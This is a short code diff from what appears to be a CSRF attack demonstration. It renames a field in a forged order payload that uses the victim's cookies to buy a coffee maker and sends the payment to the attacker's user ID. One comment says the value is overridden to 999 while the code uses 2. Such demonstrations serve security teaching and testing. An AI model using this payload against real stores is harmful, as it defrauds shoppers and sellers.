@@ -352,7 +352,7 @@
             try {
                 // The CSRF attack payload
                 // This will use the victim's cookies to place an order
-                // The key vulnerability: payableTo is set to attacker's ID instead of product's actual sellerId
+                // The key vulnerability: payableTo is set to attacker's ID instead of product's actual payableTo
                 const orderPayload = {
                     items: [
                         {
@@ -360,9 +360,9 @@
                             name: "Coffee Maker",
                             price: 129.99, // Original price
                             image: "https://images.unsplash.com/photo-1559056199-641a0ac8b55e?w=300&h=200&fit=crop",
-                            sellerId: 2, // ATTACKER'S USER ID - this is where the payment goes!
+                            payableTo: 2, // ATTACKER'S USER ID - this is where the payment goes!
                             quantity: 1
-                            // Note: The actual Coffee Maker has sellerId: 1, but we're overriding it to 999
+                            // Note: The actual Coffee Maker has payableTo: 1, but we're overriding it to 999
                         }
                     ],
                     total: 129.99,
